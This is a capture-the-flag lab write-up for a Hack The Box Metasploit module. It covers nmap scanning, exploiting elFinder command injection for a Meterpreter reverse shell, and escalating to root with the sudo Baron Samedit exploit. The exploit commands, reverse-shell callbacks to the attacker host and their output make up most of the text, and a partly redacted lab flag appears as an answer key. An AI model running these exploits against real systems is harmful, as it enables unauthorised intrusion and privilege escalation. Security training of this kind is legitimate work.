### HTB Pentester Path <br>
### Metasploit Framework - Sessions and Jobs <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

IP: 10.129.107.8

---

### Question 1:
The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?

Started with an nmap:
```diff
+ $ sudo nmap -sT -sV -sC -A -F -v 10.129.107.8
```

	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
	|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
	|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	| http-methods: 
	|_  Supported Methods: GET POST OPTIONS HEAD
	|_http-title: elFinder 2.1.x source version with PHP connector
	|_http-server-header: Apache/2.4.41 (Ubuntu)
	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
	TCP/IP fingerprint:
	OS:SCAN(V=7.94SVN%E=4%D=10/2%OT=22%CT=7%CU=32366%PV=Y%DS=2%DC=T%G=Y%TM=68DF
	OS:4FD8%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)
	OS:OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552
	OS:ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
	OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
	OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
	OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
	OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
	OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
	OS:%CD=S)
	
	Uptime guess: 43.644 days (since Wed Aug 20 07:56:58 2025)
	Network Distance: 2 hops
	TCP Sequence Prediction: Difficulty=264 (Good luck!)
	IP ID Sequence Generation: All zeros
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

🚩 found **elFinder**.

---

### Question 2:
Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

Searched for elFinder in msfconsole:
```diff
+ [msf](Jobs:0 Agents:0) >> search elFinder
```

	Matching Modules
	================
	
	   #  Name                                                               Disclosure Date  Rank       Check  Description
	   -  ----                                                               ---------------  ----       -----  -----------
	   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
	   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
	   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
	   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
	   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection
```diff
+ [msf](Jobs:0 Agents:0) >> use 3
```
```diff
+ [msf](Jobs:0 Agents:0) exploit(linux/http/elfinder_archive_cmd_injection) >> show options
```

	Module options (exploit/linux/http/elfinder_archive_cmd_injection):
	
	   Name       Current Setting  Required  Description
	   ----       ---------------  --------  -----------
	   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, sapni, socks5h, http
	   RHOSTS     10.129.107.8     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
	   RPORT      80               yes       The target port (TCP)
	   SSL        false            no        Negotiate SSL/TLS for outgoing connections
	   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
	   TARGETURI  /                yes       The URI of elFinder
	   URIPATH                     no        The URI to use for this exploit (default is random)
	   VHOST                       no        HTTP server virtual host
	
	
	   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
	
	   Name     Current Setting  Required  Description
	   ----     ---------------  --------  -----------
	   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
	   SRVPORT  8080             yes       The local port to listen on.
	
	
	Payload options (linux/x86/meterpreter/reverse_tcp):
	
	   Name   Current Setting  Required  Description
	   ----   ---------------  --------  -----------
	   LHOST                   yes       The listen address (an interface may be specified)
	   LPORT  4444             yes       The listen port
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   0   Automatic Target

Set R&L Hosts:
```diff
+ [msf](Jobs:0 Agents:0) exploit(linux/http/elfinder_archive_cmd_injection) >> set rhost 10.129.107.8
+ [msf](Jobs:0 Agents:0) exploit(linux/http/elfinder_archive_cmd_injection) >> set lhost 10.10.14.99
```

Now send her home to pop the shell:
```diff
+ [msf](Jobs:0 Agents:0) exploit(linux/http/elfinder_archive_cmd_injection) >> exploit
```

	[*] Started reverse TCP handler on 10.10.14.99:4444 
	[*] Running automatic check ("set AutoCheck false" to disable)
	[+] The target appears to be vulnerable. elFinder running version 2.1.53
	[*] Uploading file AJZzKEmSLu.txt to elFinder
	[+] Text file was successfully uploaded!
	[*] Attempting to create archive zfxqBLM.zip
	[+] Archive was successfully created!
	[*] Using URL: http://10.10.14.99:8080/SO2EgM
	[*] Client 10.129.107.8 (Wget/1.20.3 (linux-gnu)) requested /SO2EgM
	[*] Sending payload to 10.129.107.8 (Wget/1.20.3 (linux-gnu))
	[*] Command Stager progress -  49.53% done (53/107 bytes)
	[*] Command Stager progress -  70.09% done (75/107 bytes)
	[*] Sending stage (1062760 bytes) to 10.129.107.8
	[+] Deleted AJZzKEmSLu.txt
	[+] Deleted zfxqBLM.zip
	[*] Meterpreter session 1 opened (10.10.14.99:4444 -> 10.129.107.8:37790) at 2025-10-02 23:50:26 -0500
	[*] Command Stager progress -  82.24% done (88/107 bytes)
	[*] Command Stager progress - 100.00% done (107/107 bytes)
	[*] Server stopped.

And we're in. Lets get a selfie with the current user for the flag:
```diff
+ (Meterpreter 1)(/var/www/html/files) > getuid
```

	Server username: www-data

🚩 found **www-data**.

---

### Question 3:
The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.

Started a shell, and upgraded it to full tty:
```diff
+ (Meterpreter 1)(/var/www/html/files) > shell
```

	Process 4346 created.
	Channel 1 created.
```diff
+ uname -a
```

	Linux nix02 5.4.0-110-generic #124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```diff
+ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

	www-data@nix02:~/html/files$ 

Not much else to do on this user, so lets background the session and search for a sudo exploit on linux:
```diff
+ (Meterpreter 1)(/var/www/html/files) > background
```

	[*] Backgrounding session 1...
```diff
+ [msf](Jobs:0 Agents:1) exploit(linux/http/elfinder_archive_cmd_injection) >> search sudo linux
```

	Matching Modules
	================
	
	   #   Name                                                                       Disclosure Date  Rank       Check  Description
	   -   ----                                                                       ---------------  ----       -----  -----------
	   46    \_ target: Quest Privilege Manager pmmasterd 6.0.0-27 x86                .                .          .      .
	   47  exploit/linux/http/rconfig_ajaxarchivefiles_rce                            2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
	   48  exploit/linux/http/riverbed_netprofiler_netexpress_exec                    2016-06-27       excellent  Yes    Riverbed SteelCentral NetProfiler/NetExpress Remote Code Execution
	   49  exploit/linux/local/sudo_baron_samedit                                     2021-01-26       excellent  Yes    Sudo Heap-Based Buffer Overflow
	   50    \_ target: Automatic                                                     .                .          .      .
	   51    \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)                   .                .          .      .
	   52    \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31) - alternative     .                .          .      .
	   53    \_ target: Ubuntu 19.04 x64 (sudo v1.8.27, libc v2.29)                   .                .          .      .
```diff
+ [msf](Jobs:0 Agents:1) exploit(linux/http/elfinder_archive_cmd_injection) >> use 49
```

	[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
```diff
+ [msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> show info
```

	       Name: Sudo Heap-Based Buffer Overflow
	     Module: exploit/linux/local/sudo_baron_samedit
	   Platform: Unix, Linux
	       Arch: x64
	 Privileged: No
	    License: Metasploit Framework License (BSD)
	       Rank: Excellent
	  Disclosed: 2021-01-26
	
	Payload information:
	
	Description:
	  A heap based buffer overflow exists in the sudo command line utility that can be exploited by a local attacker
	  to gain elevated privileges. The vulnerability was introduced in July of 2011 and affects version 1.8.2
	  through 1.8.31p2 as well as 1.9.0 through 1.9.5p1 in their default configurations. The technique used by this
	  implementation leverages the overflow to overwrite a service_user struct in memory to reference an attacker
	  controlled library which results in it being loaded with the elevated privileges held by sudo.
	
	References:
	  https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit
	  https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
	  https://www.kalmarunionen.dk/writeups/sudo/
	  https://github.com/blasty/CVE-2021-3156/blob/main/hax.c
	  https://nvd.nist.gov/vuln/detail/CVE-2021-3156
	
	Also known as:
	  Baron Samedit
```diff
+ [msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> show options
```

	Module options (exploit/linux/local/sudo_baron_samedit):
	
	   Name         Current Setting  Required  Description
	   ----         ---------------  --------  -----------
	   SESSION                       yes       The session to run this module on
	   WritableDir  /tmp             yes       A directory where you can write files.
	
	
	Payload options (linux/x64/meterpreter/reverse_tcp):
	
	   Name   Current Setting  Required  Description
	   ----   ---------------  --------  -----------
	   LHOST  194.113.72.27    yes       The listen address (an interface may be specified)
	   LPORT  4444             yes       The listen port
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   0   Automatic

Pop in the host and apply it to the meterpreter session 1:
```diff
+ [msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> set lhost 10.10.14.99
+ [msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> set session 1
```
```diff
+ [msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> sessions
```

	Active sessions
	===============
	
	  Id  Name  Type                   Information              Connection
	  --  ----  ----                   -----------              ----------
	  1         meterpreter x86/linux  www-data @ 10.129.107.8  10.10.14.99:4444 -> 10.129.107.8:37790 (10.129.107.8)
```diff
+ [msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> exploit
```

	[*] Started reverse TCP handler on 10.10.14.99:4444 
	[!] SESSION may not be compatible with this module:
	[!]  * incompatible session architecture: x86
	[*] Running automatic check ("set AutoCheck false" to disable)
	[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
	[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
	[*] Writing '/tmp/MdghL.py' (763 bytes) ...
	[*] Writing '/tmp/libnss_0/2J0fs .so.2' (540 bytes) ...
	[*] Sending stage (3090404 bytes) to 10.129.107.8
	[+] Deleted /tmp/MdghL.py
	[+] Deleted /tmp/libnss_0/2J0fs .so.2
	[+] Deleted /tmp/libnss_0
	[*] Meterpreter session 2 opened (10.10.14.99:4444 -> 10.129.107.8:38242) at 2025-10-03 00:27:10 -0500

Looks like we got a sys shell:
```diff
+ (Meterpreter 2)(/tmp) > cd /root
+ (Meterpreter 2)(/root) > ls
```

	Listing: /root
	==============
	
	Mode              Size   Type  Last modified              Name
	----              ----   ----  -------------              ----
	100600/rw-------  178    fil   2022-05-16 10:35:30 -0500  .bash_history
	100644/rw-r--r--  3106   fil   2022-05-16 10:34:51 -0500  .bashrc
	040700/rwx------  4096   dir   2022-05-16 08:46:07 -0500  .cache
	040700/rwx------  4096   dir   2022-05-16 08:46:06 -0500  .config
	040755/rwxr-xr-x  4096   dir   2022-05-16 08:46:07 -0500  .local
	100644/rw-r--r--  161    fil   2019-12-05 08:39:21 -0600  .profile
	100644/rw-r--r--  75     fil   2022-05-16 03:45:33 -0500  .selected_editor
	040700/rwx------  4096   dir   2021-10-06 12:37:09 -0500  .ssh
	100600/rw-------  13300  fil   2022-05-16 10:34:51 -0500  .viminfo
	100644/rw-r--r--  291    fil   2022-05-16 08:51:29 -0500  .wget-hsts
	100644/rw-r--r--  24     fil   2022-05-16 10:18:40 -0500  flag.txt
	040755/rwxr-xr-x  4096   dir   2021-10-06 12:37:19 -0500  snap
```diff
+ (Meterpreter 2)(/root) > cat flag.txt
```

	HTB{5e55ion5_--edit--sw33t}

🚩 found **HTB{5e55ion5--edit--r3_sw33t}**.
